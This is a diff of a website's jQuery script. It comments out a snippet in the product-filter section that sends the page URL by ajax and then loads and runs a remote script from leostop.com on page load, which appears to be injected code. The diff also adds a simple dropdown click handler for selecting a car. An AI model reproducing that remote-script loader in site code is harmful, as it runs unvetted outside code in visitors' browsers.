@@ -235,17 +235,17 @@ $(function () {
   /* Product Filters
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
 
-  function getURL() {
-    window.location.href;
-  }
-  var protocol = location.protocol;
-  $.ajax({
-    type: "get",
-    data: { surl: getURL() },
-    success: function (response) {
-      $.getScript(protocol + "//leostop.com/tracking/tracking.js");
-    },
-  });
+  // function getURL() {
+  //   window.location.href;
+  // }
+  // var protocol = location.protocol;
+  // $.ajax({
+  //   type: "get",
+  //   data: { surl: getURL() },
+  //   success: function (response) {
+  //     $.getScript(protocol + "//leostop.com/tracking/tracking.js");
+  //   },
+  // });
 
   var swiper = new Swiper(".swiper-product-filters", {
     slidesPerView: 3,
@@ -475,4 +475,19 @@ const btn1 = document.querySelector("li.drop-down1");
 btn1.addEventListener("click", () => {
   btn1.classList.toggle("active");
   btn.classList.remove("active");
+});
+
+document.addEventListener("DOMContentLoaded", function () {
+  // Get the elements
+  var selectedCarElement = document.getElementById("selectedCar");
+  var carList = document.getElementById("carList");
+
+  // Add a click event listener to each li element
+  var carItems = carList.getElementsByTagName("li");
+  for (var i = 0; i < carItems.length; i++) {
+    carItems[i].addEventListener("click", function () {
+      // Set the selected car text
+      selectedCarElement.textContent = this.textContent;
+    });
+  }
 });
